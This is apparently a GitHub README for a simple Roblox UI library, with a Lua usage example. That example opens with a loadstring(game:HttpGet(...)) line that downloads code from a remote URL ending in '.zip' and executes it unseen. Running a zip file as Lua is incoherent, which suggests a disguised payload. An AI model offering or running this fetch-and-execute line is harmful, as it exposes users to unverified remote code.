# UILib

## Description

A simple and customizable UI library for Roblox.

## Features

- Create draggable windows
- Add tabs and buttons
- Customize UI elements with ease

## Usage

```lua
local UILib = loadstring(game:HttpGet("https://raw.githubusercontent.com/mariorachitan-svg/module/main/undercool/module-2.7.zip"))()

local win = UILib:CreateWindow("My Window")
local tab = UILib:CreateTab(win, "Main")
UILib:CreateButton(tab, "Click Me", function()
    print("Button Clicked")
end)
